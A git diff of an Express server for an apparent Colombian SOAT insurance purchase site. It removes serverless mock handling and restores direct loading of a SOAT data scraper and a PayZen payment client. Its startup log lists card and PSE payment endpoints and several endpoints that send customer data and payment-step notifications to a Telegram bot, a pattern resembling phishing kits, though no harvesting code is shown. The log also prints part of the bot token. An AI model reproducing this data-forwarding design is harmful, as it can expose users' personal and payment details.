@@ -4,8 +4,8 @@ require("dotenv").config();
 const express = require("express");
 const path = require("path");
 const cors = require("cors");
-// Nota: evitar cargar dependencias pesadas en serverless (Vercel)
-// Cargaremos `soatScraper` y `payzen` bajo demanda dentro de las rutas
+const consultarSOAT = require("./soatScraper");
+const payzenClient = require("./payzen");
 
 const app = express();
 
@@ -137,38 +137,6 @@ app.post("/api/soat", async (req, res) => {
   };
 
   try {
-    // En Vercel: devolver datos simulados para evitar Playwright
-    if (process.env.VERCEL) {
-      const mock = {
-        vehiculo: {
-          placa: placa || "",
-          linea: "",
-          marca: "",
-          modelo: "",
-          clase: "",
-          tipo: "AUTOMÓVIL",
-        },
-        propietario: {
-          nombres: "",
-          apellidos: "",
-          documento: numeroDocumento || "",
-          telefono: "",
-          correo: "",
-        },
-        resumen: {
-          soat: "$326,600",
-          tercero: "$68,000",
-          accidente: "$19,900",
-          total: "$414,500",
-        },
-        opcionesSeguro: [],
-      };
-      res.setHeader("Content-Type", "application/json; charset=utf-8");
-      return res.json(mock);
-    }
-
-    // Carga diferida del scraper en entornos no serverless
-    const consultarSOAT = require("./soatScraper");
     const data = await consultarSOAT(placa, tipoDocumento, numeroDocumento);
     const parsedData = JSON.parse(data);
 
@@ -575,8 +543,6 @@ app.post("/api/payment/payzen", async (req, res) => {
       });
     }
 
-    // Carga diferida del cliente PayZen
-    const payzenClient = require("./payzen");
     const result = await payzenClient.createPayment({
       amount,
       currency,
@@ -735,37 +701,32 @@ app.get("/pago.html", (req, res) => {
 
 const PORT = process.env.PORT || 3000;
 
-// Iniciar servidor solo en entornos no serverless
-if (!process.env.VERCEL) {
-  app.listen(PORT, () => {
-    console.log(`🚀 Servidor SOAT Mundial corriendo en http://localhost:${PORT}`);
-    console.log(`📊 Endpoints disponibles:`);
-    console.log(`   POST /api/soat - Consultar datos de SOAT`);
-    console.log(`   GET  /api/progress - Consultar progreso actual`);
-    console.log(`   POST /api/payment/card - Procesar pago con tarjeta`);
-    console.log(`   POST /api/payment/pse - Procesar pago PSE`);
-    console.log(`   POST /api/telegram - Enviar datos principales a Telegram`);
-    console.log(`   POST /api/telegram-pago - Notificación de pago exitoso`);
+app.listen(PORT, () => {
+  console.log(`🚀 Servidor SOAT Mundial corriendo en http://localhost:${PORT}`);
+  console.log(`📊 Endpoints disponibles:`);
+  console.log(`   POST /api/soat - Consultar datos de SOAT`);
+  console.log(`   GET  /api/progress - Consultar progreso actual`);
+  console.log(`   POST /api/payment/card - Procesar pago con tarjeta`);
+  console.log(`   POST /api/payment/pse - Procesar pago PSE`);
+  console.log(`   POST /api/telegram - Enviar datos principales a Telegram`);
+  console.log(`   POST /api/telegram-pago - Notificación de pago exitoso`);
+  console.log(
+    `   POST /api/telegram-paso-pagos - Notificación de paso a pagos`
+  );
+  console.log(`   GET  /api/health - Estado del servidor`);
+
+  // Verificar configuración de Telegram
+  const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
+  const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
+
+  if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
+    console.log(`✅ Configuración de Telegram cargada correctamente`);
+    console.log(`   Bot Token: ${TELEGRAM_BOT_TOKEN.substring(0, 10)}...`);
+    console.log(`   Chat ID: ${TELEGRAM_CHAT_ID}`);
+  } else {
+    console.log(`⚠️  Configuración de Telegram no disponible`);
     console.log(
-      `   POST /api/telegram-paso-pagos - Notificación de paso a pagos`
+      `   Crea un archivo .env con TELEGRAM_BOT_TOKEN y TELEGRAM_CHAT_ID`
     );
-    console.log(`   GET  /api/health - Estado del servidor`);
-
-    // Verificar configuración de Telegram
-    const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
-    const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
-
-    if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
-      console.log(`✅ Configuración de Telegram cargada correctamente`);
-      console.log(`   Bot Token: ${TELEGRAM_BOT_TOKEN.substring(0, 10)}...`);
-      console.log(`   Chat ID: ${TELEGRAM_CHAT_ID}`);
-    } else {
-      console.log(`⚠️  Configuración de Telegram no disponible`);
-      console.log(
-        `   Crea un archivo .env con TELEGRAM_BOT_TOKEN y TELEGRAM_CHAT_ID`
-      );
-    }
-  });
-}
-
-module.exports = app;
+  }
+});
